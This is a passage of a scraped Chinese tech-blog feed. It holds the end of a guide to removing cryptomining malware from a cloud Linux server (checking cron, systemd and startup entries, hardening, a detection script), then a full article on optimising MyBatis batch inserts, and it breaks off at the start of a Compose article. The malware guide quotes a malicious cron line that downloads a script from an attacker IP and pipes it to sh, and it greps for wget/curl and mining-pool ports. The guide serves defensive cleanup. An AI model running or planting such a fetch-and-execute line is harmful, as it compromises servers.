<p>⚠️ <strong>注意</strong>：有些病毒会通过守护进程或定时任务自动重启！所以不能只 kill 进程！</p>
<hr/>
<h3 data-id="heading-3">⏰ 第四步：检查持久化入口（关键！）</h3>
<h4 data-id="heading-4">1. 检查定时任务（cron）</h4>
<pre><code class="hljs language-bash" lang="bash">crontab -l                    <span class="hljs-comment"># 当前用户</span>
crontab -u root -l            <span class="hljs-comment"># root 用户</span>
<span class="hljs-built_in">cat</span> /etc/crontab
<span class="hljs-built_in">ls</span> /etc/cron.d/
<span class="hljs-built_in">ls</span> /var/spool/cron/crontabs/  <span class="hljs-comment"># Ubuntu 路径</span>
<span class="hljs-built_in">ls</span> /var/spool/cron/           <span class="hljs-comment"># CentOS 路径</span>
</code></pre>
<p>🔍 常见恶意 cron 示例：</p>
<pre><code class="hljs language-typescript" lang="typescript">*<span class="hljs-regexp">/5 * * * * wget -q -O- http:/</span><span class="hljs-regexp">/恶意IP/u</span>pdate.<span class="hljs-property">sh</span> | sh
<span class="hljs-meta">@reboot</span> /tmp/.<span class="hljs-property">sysupdate</span>
</code></pre>
<p>→ <strong>删除这些行</strong>，或直接清空可疑用户的 crontab：</p>
<pre><code class="hljs language-bash" lang="bash">crontab -r   <span class="hljs-comment"># 清空当前用户 cron（谨慎使用）</span>
</code></pre>
<h4 data-id="heading-5">2. 检查 systemd 服务（较新病毒会伪装成服务）</h4>
<pre><code class="hljs language-bash" lang="bash">systemctl list-unit-files --<span class="hljs-built_in">type</span>=service | grep enabled
<span class="hljs-built_in">ls</span> /etc/systemd/system/
</code></pre>
<p>删除可疑服务：</p>
<pre><code class="hljs language-bash" lang="bash">systemctl stop malicious.service
systemctl <span class="hljs-built_in">disable</span> malicious.service
<span class="hljs-built_in">rm</span> -f /etc/systemd/system/malicious.service
</code></pre>
<h4 data-id="heading-6">3. 检查 rc.local、init.d 等启动项</h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-built_in">cat</span> /etc/rc.local
<span class="hljs-built_in">ls</span> /etc/init.d/ | grep -E <span class="hljs-string">"(sys|net|watch|update)"</span>
</code></pre>
<hr/>
<h3 data-id="heading-7">🔐 第五步：封堵入侵源头</h3>
<p>CPU 飙升通常是<strong>已有漏洞被利用</strong>的结果。常见入口包括：</p>





























<table><thead><tr><th>入口</th><th>修复建议</th></tr></thead><tbody><tr><td><strong>Redis 未授权访问</strong></td><td>绑定 127.0.0.1，设置密码，关闭 AOF/RDB 自动加载脚本</td></tr><tr><td><strong>SSH 弱密码爆破</strong></td><td>改用密钥登录，禁用 root 登录，改 SSH 端口</td></tr><tr><td><strong>Web 应用漏洞（如 WordPress、ThinkPHP）</strong></td><td>升级 CMS/框架，删除未使用插件</td></tr><tr><td><strong>Docker API 暴露</strong></td><td>不要将 2375 端口暴露到公网</td></tr><tr><td><strong>Nginx/Apache 配置错误导致目录遍历</strong></td><td>检查配置，禁止列出目录</td></tr></tbody></table>
<p>👉 <strong>立即检查：</strong></p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 查看最近的 SSH 登录（是否有异常 IP）</span>
grep <span class="hljs-string">"Accepted"</span> /var/log/auth.log | <span class="hljs-built_in">tail</span> -20    <span class="hljs-comment"># Ubuntu</span>
grep <span class="hljs-string">"Accepted"</span> /var/log/secure | <span class="hljs-built_in">tail</span> -20      <span class="hljs-comment"># CentOS</span>

<span class="hljs-comment"># 查看监听端口（是否有 Redis 6379、MongoDB 27017 暴露？）</span>
ss -tulnp
</code></pre>
<hr/>
<h3 data-id="heading-8">🛡️ 第六步：加固与监控</h3>
<ol>
<li>
<p><strong>启用阿里云「云安全中心」</strong></p>
<ul>
<li>免费版即可检测挖矿行为</li>
<li>开启「病毒查杀」+「入侵检测」</li>
</ul>
</li>
<li>
<p><strong>安装实时监控工具</strong></p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 安装 atop（记录历史资源使用）</span>
apt install atop -y   <span class="hljs-comment"># 或 yum install atop</span>
systemctl <span class="hljs-built_in">enable</span> --now atop
</code></pre>
</li>
<li>
<p><strong>限制普通用户执行权限</strong></p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 例如禁止 /tmp 执行程序（在 /etc/fstab 中添加 noexec）</span>
mount -o remount,noexec,nosuid /tmp
mount -o remount,noexec,nosuid /dev/shm
</code></pre>
</li>
</ol>
<hr/>
<h3 data-id="heading-9">💣 极端建议：重装系统</h3>
<p>如果反复感染、无法彻底清除，<strong>最安全的方式是</strong>：</p>
<ol>
<li>在阿里云控制台 <strong>创建当前磁盘快照</strong>（用于取证）</li>
<li><strong>更换系统盘</strong>（重装干净的官方镜像）</li>
<li><strong>仅恢复业务数据</strong>（不要恢复可执行文件、脚本、配置文件）</li>
<li><strong>重新部署应用，并严格遵循安全规范</strong></li>
</ol>
<hr/>
<h3 data-id="heading-10">✅ 附：快速检测脚本（可复制运行）</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-meta">#!/bin/bash</span>
<span class="hljs-built_in">echo</span> <span class="hljs-string">"=== 高 CPU 进程 ==="</span>
ps aux --<span class="hljs-built_in">sort</span>=-%cpu | <span class="hljs-built_in">head</span> -n 10

<span class="hljs-built_in">echo</span> -e <span class="hljs-string">"\n=== 可疑定时任务 ==="</span>
grep -r <span class="hljs-string">""</span> /var/spool/cron/ /etc/cron* 2&gt;/dev/null | grep -v <span class="hljs-string">"^#"</span> | grep -E <span class="hljs-string">".(sh|py|pl|elf)|wget|curl|http"</span>

<span class="hljs-built_in">echo</span> -e <span class="hljs-string">"\n=== /tmp 和 /dev/shm 中的可执行文件 ==="</span>
find /tmp /dev/shm -<span class="hljs-built_in">type</span> f -executable 2&gt;/dev/null

<span class="hljs-built_in">echo</span> -e <span class="hljs-string">"\n=== 外连可疑 IP（挖矿常连境外）==="</span>
ss -tulnp | grep -E <span class="hljs-string">"(4444|5555|3333|stratum)"</span>  <span class="hljs-comment"># 常见矿池端口</span>
</code></pre>
<p>保存为 <code>check_mining.sh</code>，<code>chmod +x</code> 后运行。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[MyBatis 批量插入从5分钟缩短到3秒？我的三个关键优化]]></title>    <link>https://juejin.cn/post/7600982613653766194</link>    <guid>https://juejin.cn/post/7600982613653766194</guid>    <pubDate>2026-01-30T13:23:21.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7600982613653766194" data-draft-id="7600787795478069294" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="MyBatis 批量插入从5分钟缩短到3秒？我的三个关键优化"/> <meta itemprop="keywords" content="Java"/> <meta itemprop="datePublished" content="2026-01-30T13:23:21.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="皮皮林551"/> <meta itemprop="url" content="https://juejin.cn/user/2447981921436084"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            MyBatis 批量插入从5分钟缩短到3秒？我的三个关键优化
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2447981921436084/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    皮皮林551
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-30T13:23:21.000Z" title="Fri Jan 30 2026 13:23:21 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-30
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>上周接了个数据迁移的活，要把10万条数据从老系统导入新系统。</p>
<p>写了个简单的批量插入，跑起来一看——5分钟。</p>
<p>领导说太慢了，能不能快点？</p>
<p>折腾了一下午，最后优化到3秒，记录一下过程。</p>
<h3 data-id="heading-0"><strong>最初的代码（5分钟）</strong></h3>
<p>最开始写的很简单，foreach循环插入：</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-comment">// 方式1：循环单条插入（最慢）</span>
for (User user : userList) {
    userMapper<span class="hljs-selector-class">.insert</span>(user);
}
</code></pre>
<p>10万条数据，每条都要走一次网络请求、一次SQL解析、一次事务提交。</p>
<p>算一下：假设每条插入需要3ms，10万条就是300秒 = 5分钟。</p>
<p><strong>这是最蠢的写法，但我见过很多项目都这么写。</strong></p>
<h3 data-id="heading-1"><strong>第一次优化：批量SQL（30秒）</strong></h3>
<p>把循环插入改成批量SQL：</p>
<pre><code class="hljs language-ini" lang="ini">&lt;!-- Mapper.xml --&gt;
&lt;insert <span class="hljs-attr">id</span>=<span class="hljs-string">"batchInsert"</span>&gt;
    INSERT INTO user (name, age, email) VALUES
    &lt;foreach <span class="hljs-attr">collection</span>=<span class="hljs-string">"list"</span> item=<span class="hljs-string">"item"</span> separator=<span class="hljs-string">","</span>&gt;
        (<span class="hljs-comment">#{item.name}, #{item.age}, #{item.email})</span>
    &lt;/foreach&gt;
&lt;/insert&gt;
// 分批插入，每批1000条
int <span class="hljs-attr">batchSize</span> = <span class="hljs-number">1000</span><span class="hljs-comment">;</span>
for (int <span class="hljs-attr">i</span> = <span class="hljs-number">0</span><span class="hljs-comment">; i &lt; userList.size(); i += batchSize) {</span>
    int <span class="hljs-attr">end</span> = Math.min(i + batchSize, userList.size())<span class="hljs-comment">;</span>
    List&lt;User&gt; <span class="hljs-attr">batch</span> = userList.subList(i, end)<span class="hljs-comment">;</span>
    userMapper.batchInsert(batch)<span class="hljs-comment">;</span>
}
</code></pre>
<p>从5分钟降到30秒，提升10倍。</p>
<blockquote>
<p>“</p>
<p>原理：一条SQL插入多条数据，减少网络往返次数。</p>
</blockquote>
<p>但还有问题：30秒还是太慢。</p>
<h3 data-id="heading-2"><strong>第二次优化：JDBC批处理（8秒）</strong></h3>
<p>MySQL有个参数叫<code>rewriteBatchedStatements</code>，开启后可以把多条INSERT合并成一条。</p>
<h5 data-id="heading-3"><strong>第一步：修改数据库连接URL</strong></h5>
<pre><code class="hljs language-bash" lang="bash">jdbc:mysql://localhost:3306/test?rewriteBatchedStatements=<span class="hljs-literal">true</span>
</code></pre>
<h5 data-id="heading-4"><strong>第二步：使用MyBatis的批处理模式</strong></h5>
<pre><code class="hljs language-ini" lang="ini">@Autowired
private SqlSessionFactory sqlSessionFactory<span class="hljs-comment">;</span>

public void batchInsertWithExecutor(List&lt;User&gt; userList) {
    try (SqlSession <span class="hljs-attr">sqlSession</span> = sqlSessionFactory.openSession(ExecutorType.BATCH)) {
        UserMapper <span class="hljs-attr">mapper</span> = sqlSession.getMapper(UserMapper.class)<span class="hljs-comment">;</span>
        
        int <span class="hljs-attr">batchSize</span> = <span class="hljs-number">1000</span><span class="hljs-comment">;</span>
        for (int <span class="hljs-attr">i</span> = <span class="hljs-number">0</span><span class="hljs-comment">; i &lt; userList.size(); i++) {</span>
            mapper.insert(userList.get(i))<span class="hljs-comment">;</span>
            
            if ((i + 1) % <span class="hljs-attr">batchSize</span> == <span class="hljs-number">0</span>) {
                sqlSession.flushStatements()<span class="hljs-comment">;</span>
                sqlSession.clearCache()<span class="hljs-comment">;</span>
            }
        }
        sqlSession.flushStatements()<span class="hljs-comment">;</span>
        sqlSession.commit()<span class="hljs-comment">;</span>
    }
}
</code></pre>
<p>从30秒降到8秒。</p>
<blockquote>
<p>“</p>
<p>原理：<code>ExecutorType.BATCH</code>模式下，MyBatis会缓存SQL，最后一次性发送给数据库执行。配合<code>rewriteBatchedStatements=true</code>，MySQL驱动会把多条INSERT合并。</p>
</blockquote>
<h3 data-id="heading-5"><strong>第三次优化：多线程并行（3秒）</strong></h3>
<p>8秒还是不够快，上多线程：</p>
<pre><code class="hljs language-ini" lang="ini">public void parallelBatchInsert(List&lt;User&gt; userList) {
    int <span class="hljs-attr">threadCount</span> = <span class="hljs-number">4</span><span class="hljs-comment">;  // 根据数据库连接池大小调整</span>
    int <span class="hljs-attr">batchSize</span> = userList.size() / threadCount<span class="hljs-comment">;</span>
    
    ExecutorService <span class="hljs-attr">executor</span> = Executors.newFixedThreadPool(threadCount)<span class="hljs-comment">;</span>
    List&lt;Future&lt;?&gt;&gt; <span class="hljs-attr">futures</span> = new ArrayList&lt;&gt;()<span class="hljs-comment">;</span>
    
    for (int <span class="hljs-attr">i</span> = <span class="hljs-number">0</span><span class="hljs-comment">; i &lt; threadCount; i++) {</span>
        int <span class="hljs-attr">start</span> = i * batchSize<span class="hljs-comment">;</span>
        int <span class="hljs-attr">end</span> = (i == threadCount - <span class="hljs-number">1</span>) ? userList.size() : (i + <span class="hljs-number">1</span>) * batchSize<span class="hljs-comment">;</span>
        List&lt;User&gt; <span class="hljs-attr">subList</span> = userList.subList(start, end)<span class="hljs-comment">;</span>
        
        futures.add(executor.submit(() -&gt; {
            batchInsertWithExecutor(subList)<span class="hljs-comment">;</span>
        }))<span class="hljs-comment">;</span>
    }
    
    // 等待所有任务完成
    for (Future&lt;?&gt; future : futures) {
        try {
            future.get()<span class="hljs-comment">;</span>
        } catch (Exception e) {
            thrownew RuntimeException(e)<span class="hljs-comment">;</span>
        }
    }
    
    executor.shutdown()<span class="hljs-comment">;</span>
}
</code></pre>
<p>从8秒降到3秒。</p>
<p>注意事项：</p>
<ul>
<li>线程数不要超过数据库连接池大小</li>
<li>如果需要事务一致性，这个方案不适用</li>
<li>要考虑主键冲突的问题</li>
</ul>
<h3 data-id="heading-6"><strong>优化效果对比</strong></h3>






























<table><thead><tr><th>方案</th><th>耗时</th><th>提升倍数</th></tr></thead><tbody><tr><td>循环单条插入</td><td>300秒</td><td>基准</td></tr><tr><td>批量SQL</td><td>30秒</td><td>10倍</td></tr><tr><td>JDBC批处理</td><td>8秒</td><td>37倍</td></tr><tr><td>多线程并行</td><td>3秒</td><td>100倍</td></tr></tbody></table>
<h3 data-id="heading-7"><strong>踩过的坑</strong></h3>
<h5 data-id="heading-8"><strong>坑1：foreach拼接SQL过长</strong></h5>
<pre><code class="hljs language-ini" lang="ini">&lt;foreach <span class="hljs-attr">collection</span>=<span class="hljs-string">"list"</span> item=<span class="hljs-string">"item"</span> separator=<span class="hljs-string">","</span>&gt;
</code></pre>
<p>如果一次插入太多条，SQL会非常长，可能超过<code>max_allowed_packet</code>限制。</p>
<p><strong>解决：</strong>  分批插入，每批500-1000条。</p>
<h5 data-id="heading-9"><strong>坑2：rewriteBatchedStatements不生效</strong></h5>
<p>检查几个点：</p>
<ul>
<li>URL参数是否正确：<code>rewriteBatchedStatements=true</code></li>
<li>是否使用了<code>ExecutorType.BATCH</code></li>
<li>MySQL驱动版本是否太旧</li>
</ul>
<h5 data-id="heading-10"><strong>坑3：自增主键返回问题</strong></h5>
<p>批量插入时想获取自增主键：</p>
<pre><code class="hljs language-ini" lang="ini">&lt;insert <span class="hljs-attr">id</span>=<span class="hljs-string">"batchInsert"</span> useGeneratedKeys=<span class="hljs-string">"true"</span> keyProperty=<span class="hljs-string">"id"</span>&gt;
</code></pre>
<p>注意：<code>rewriteBatchedStatements=true</code>时，自增主键返回可能有问题，需要升级MySQL驱动到8.0.17+。</p>
<h5 data-id="heading-11"><strong>坑4：内存溢出</strong></h5>
<p>10万条数据一次性加载到内存，可能OOM。</p>
<p>解决：分页读取 + 分批插入。</p>
<pre><code class="hljs language-ini" lang="ini">int <span class="hljs-attr">pageSize</span> = <span class="hljs-number">10000</span><span class="hljs-comment">;</span>
int <span class="hljs-attr">total</span> = countTotal()<span class="hljs-comment">;</span>
for (int <span class="hljs-attr">i</span> = <span class="hljs-number">0</span><span class="hljs-comment">; i &lt; total; i += pageSize) {</span>
    List&lt;User&gt; <span class="hljs-attr">page</span> = selectByPage(i, pageSize)<span class="hljs-comment">;</span>
    batchInsertWithExecutor(page)<span class="hljs-comment">;</span>
}
</code></pre>
<h3 data-id="heading-12"><strong>最终方案代码</strong></h3>
<pre><code class="hljs language-ini" lang="ini">@Service
publicclass BatchInsertService {
    
    @Autowired
    private SqlSessionFactory sqlSessionFactory<span class="hljs-comment">;</span>
    
    /**
     * 高性能批量插入
     * 10万条数据约3秒
     */
    public void highPerformanceBatchInsert(List&lt;User&gt; userList) {
        if (<span class="hljs-attr">userList</span> == null || userList.isEmpty()) {
            return<span class="hljs-comment">;</span>
        }
        
        int <span class="hljs-attr">threadCount</span> = Math.min(<span class="hljs-number">4</span>, Runtime.getRuntime().availableProcessors())<span class="hljs-comment">;</span>
        int <span class="hljs-attr">batchSize</span> = (int) Math.ceil((double) userList.size() / threadCount)<span class="hljs-comment">;</span>
        
        ExecutorService <span class="hljs-attr">executor</span> = Executors.newFixedThreadPool(threadCount)<span class="hljs-comment">;</span>
        CountDownLatch <span class="hljs-attr">latch</span> = new CountDownLatch(threadCount)<span class="hljs-comment">;</span>
        
        for (int <span class="hljs-attr">i</span> = <span class="hljs-number">0</span><span class="hljs-comment">; i &lt; threadCount; i++) {</span>
            int <span class="hljs-attr">start</span> = i * batchSize<span class="hljs-comment">;</span>
            int <span class="hljs-attr">end</span> = Math.min((i + <span class="hljs-number">1</span>) * batchSize, userList.size())<span class="hljs-comment">;</span>
            
            if (start &gt;= userList.size()) {
                latch.countDown()<span class="hljs-comment">;</span>
                continue<span class="hljs-comment">;</span>
            }
            
            List&lt;User&gt; <span class="hljs-attr">subList</span> = new ArrayList&lt;&gt;(userList.subList(start, end))<span class="hljs-comment">;</span>
            
            executor.submit(() -&gt; {
                try {
                    doBatchInsert(subList)<span class="hljs-comment">;</span>
                } finally {
                    latch.countDown()<span class="hljs-comment">;</span>
                }
            })<span class="hljs-comment">;</span>
        }
        
        try {
            latch.await()<span class="hljs-comment">;</span>
        } catch (InterruptedException e) {
            Thread.currentThread().interrupt()<span class="hljs-comment">;</span>
        }
        
        executor.shutdown()<span class="hljs-comment">;</span>
    }
    
    private void doBatchInsert(List&lt;User&gt; userList) {
        try (SqlSession <span class="hljs-attr">sqlSession</span> = sqlSessionFactory.openSession(ExecutorType.BATCH, <span class="hljs-literal">false</span>)) {
            UserMapper <span class="hljs-attr">mapper</span> = sqlSession.getMapper(UserMapper.class)<span class="hljs-comment">;</span>
            
            for (int <span class="hljs-attr">i</span> = <span class="hljs-number">0</span><span class="hljs-comment">; i &lt; userList.size(); i++) {</span>
                mapper.insert(userList.get(i))<span class="hljs-comment">;</span>
                
                if ((i + 1) % <span class="hljs-attr">1000</span> == <span class="hljs-number">0</span>) {
                    sqlSession.flushStatements()<span class="hljs-comment">;</span>
                    sqlSession.clearCache()<span class="hljs-comment">;</span>
                }
            }
            
            sqlSession.flushStatements()<span class="hljs-comment">;</span>
            sqlSession.commit()<span class="hljs-comment">;</span>
        }
    }
}
</code></pre>
<h3 data-id="heading-13"><strong>总结</strong></h3>





















<table><thead><tr><th>优化点</th><th>关键配置</th></tr></thead><tbody><tr><td>批量SQL</td><td>foreach拼接，分批1000条</td></tr><tr><td>JDBC批处理</td><td>rewriteBatchedStatements=true+ExecutorType.BATCH</td></tr><tr><td>多线程</td><td>线程数 ≤ 连接池大小</td></tr></tbody></table>
<p><strong>核心原则：</strong>  减少网络往返 + 减少事务次数 + 并行处理。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Compose中的IntrinsicSize实战指南]]></title>    <link>https://juejin.cn/post/7600787795478134830</link>    <guid>https://juejin.cn/post/7600787795478134830</guid>    <pubDate>2026-01-30T13:57:33.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7600787795478134830" data-draft-id="7600955777316077606" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Compose中的IntrinsicSize实战指南"/> <meta itemprop="keywords" content="Android,Android Jetpack,Kotlin"/> <meta itemprop="datePublished" content="2026-01-30T13:57:33.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="稀有猿诉"/> <meta itemprop="url" content="https://juejin.cn/user/2788017216685784"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Compose中的IntrinsicSize实战指南
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2788017216685784/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    稀有猿诉
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-30T13:57:33.000Z" title="Fri Jan 30 2026 13:57:33 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-30
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    1
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读6分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body 